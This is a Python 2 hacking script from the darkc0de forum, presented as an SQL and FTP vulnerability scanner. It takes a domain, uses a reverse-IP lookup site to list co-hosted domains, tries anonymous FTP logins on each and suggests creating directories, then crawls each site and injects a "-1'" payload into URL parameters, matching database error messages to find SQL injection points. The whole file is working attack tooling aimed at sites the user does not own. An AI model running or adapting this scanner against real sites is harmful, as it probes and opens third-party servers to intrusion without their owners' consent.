import commands, sys, getopt, StringIO, re, ftplib,urllib,HTMLParser,socket,string,StringIO,sets
from ftplib import *
from HTMLParser import HTMLParser
from urllib2 import urlopen
#!/usr/bin/python 
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 
# Greetz to all Darkc0de AH,ICW Memebers 
#Darkc0de-d3hydra,beenu,hubysoft,Gatyi,
#Shoutz to ICW-:r45c4l,SMART_HAX0R,j4ckh4x0r,41w@r10r,micro,cyber_mafi,Hoodlum
#Gud Luck to:d4Rk 4n931
class checkp(HTMLParser):
    def __init__(self, ldomain, scandpth, lps):
        HTMLParser.__init__(self)
        self.url = ldomain
        self.db = {self.url: 1}
        self.node = [self.url]
 
        self.depth = scandpth 
        self.max_span = lps 
        self.links_found = 0
 
    def handle_starttag(self, tag, attrs):
        if self.links_found < self.max_span and tag == 'a' and attrs:
            link = attrs[0][1]
            if link[:4] != "http":
                link = '/'.join(self.url.split('/')[:3])+('/'+link).replace('//','/')
 
            if link not in self.db:
                print "Found Link ---> %s" % link
                self.links_found += 1
                self.node.append(link)
            self.db[link] = (self.db.get(link) or 0) + 1
 
    def deep(self):
        for depth in xrange(self.depth):
            print "*"*70+("\nScanning depth %d web\n" % (depth+1))+"*"*70
            context_node = self.node[:]
            self.node = []
            for self.url in context_node:
                self.links_found = 0
                try:
                    req = urlopen(self.url)
                    res = req.read()
                    self.feed(res)
                except:
                    self.reset()
        print "*"*40 + "\nRESULTS\n" + "*"*40
        sor = [(v,k) for (k,v) in self.db.items()]
        sor.sort(reverse = True)
        return sor

    
def sqlcheck(link):
    
    try:
        print "sqling checking"
        error="Warning"
        mysql ="mysql_fetch_array()"
        mysql2 ="mysql_fetch_array()"
	mysql3 ="You have an error in your SQL syntax"
        mssql= "Unclosed quotation mark after the character string"
        mssql2="Server Error in '/' Application"
        mssql3="Microsoft OLE DB Provider for ODBC Drivers error"
        oracle="supplied argument is not a valid OCI8-Statement"
        jetdb ="microsoft jet database engine"
        domain =link
	sqli=[]
        try:
	    if domain.count("=") >= 2:
		for x in xrange(domain.count("=")):
		    sqli.append(domain.rsplit("=",x+1)[0]+"=")
		    
	    if domain.find("=") != -1:	
	        sqli.append(domain.split("=",1)[0]+"=")	 
	    else:
	        sqli.append(domain.split("=",1)[0]+"=")
        except() ,msg: print error
	        
        sqli = list(sets.Set(sqli))
        print "[+] Checking :",len(sqli),"links\n"
        for slinks in sqli:
	    print '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
	    resp =urllib.urlopen(slinks+"-1'").read(200000)
	    print  slinks+"-1'"
	    if re.search(error, resp) != None:
	        print " FOUND UNKNOWN BUG IN THIS GET REQUEST "
            if re.search(mysql, resp) != None:
	        print " FOUND MYSQL BUG IN THIS GET REQUEST "
            if re.search(mysql2, resp) != None:
	        print " FOUND MYSQL BUG IN THIS GET REQUEST "
            if re.search(mssql, resp) != None:
	        print " FOUND MSSQL BUG IN THIS GET REQUEST "
            if re.search(mssql2, resp) != None:
	        print " FOUND MSSQL BUG IN THIS GET REQUEST "
	    if re.search(mssql3, resp) != None:
                print " FOUND MSSQL BUG IN THIS GET REQUEST "
            if re.search(oracle, resp) != None:
	        print " FOUND ORACLE BUG IN THIS GET REQUEST "
            if re.search(jetdb, resp) != None:
	        print " FOUND JET DATA BASE BUG IN THIS GET REQUEST "
	    if re.search(mysql3, resp) != None:
	        print "FOUND MYSQL BUG IN THIS GET REQUEST "
	    print '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++' 	
    except(IOError) ,msg: print 'erro'

def ftpcheck(ftpdn):
    try:
	ftp=FTP(ftpdn)
        ftp.login()
        ftp.retrlines('list')
	print "\nAnonymous loging possible: Try running a make directory command"
    except(ftplib.all_errors),msg: print "Anonymous not Possible||Or Unknown Error"
print "[+]Web Server Application SQL Vulnerability Scanner Version 1.0 by FB1H2S"
print "[+]Scans every sub domains of the given web site for SQL/FTP bugs"
print "[+]Report Bugs at fbone@in.com"
domain=raw_input("[+]Enter doamin adress:")
reverse=socket.gethostbyaddr(domain)
ip=str(reverse[2])
ip = ip[2:-2]
print '[+]Server ip[-]'+ip
url ='http://www.ipnear.com/results.php?s='+ip+'&submit=Lookup'
result = urllib.urlopen(url).read(200000)
linksList = re.findall('href=(.*?)>.*?',result)
print '[+]Checking anonymous FTP acess[+]'
ftpcheck(ip)
print '[+]Retrive Domains[+]'
raw_input('[+]Press Enter to Continue')
for link in linksList:
    strip = link[1:-1]   
    domain = strip[7:-1]
    print domain
yes=raw_input('Do u wish to check sudoamins for anonymous ftp: Y|continue: N |Skip:')
if yes=='y' or yes=='Y':
    for link in linksList:
	strip = link[1:-1]
        domain = strip[7:-1]
        print '\nFtp::'+domain+':'
        ftpcheck(domain)
elif yes=='N'or yes=='n':
    print 'Ftp check abroted[+]'
    print 'Crwling web pages for SQLing[+]'
for link in linksList:
    strip = link[1:-1]
    domain = strip[7:-1]
    print "Geting links of :->"+domain
    try:
	httpdmn='http://'+domain
	# change the scandpth value to increase the crawling depths
	check1 = checkp(ldomain = httpdmn, scandpth = 3, lps = 15)
        result = check1.deep()
        for (n,link) in result:
	    if link.find("=") != -1:
		if link.find(httpdmn)!=-1:
		    print "%s was found %d time%s." %(link,n, "s" if n is not 1 else "")
                    sqlcheck(link)
    except(IOError) ,msg: print 'skiped' 
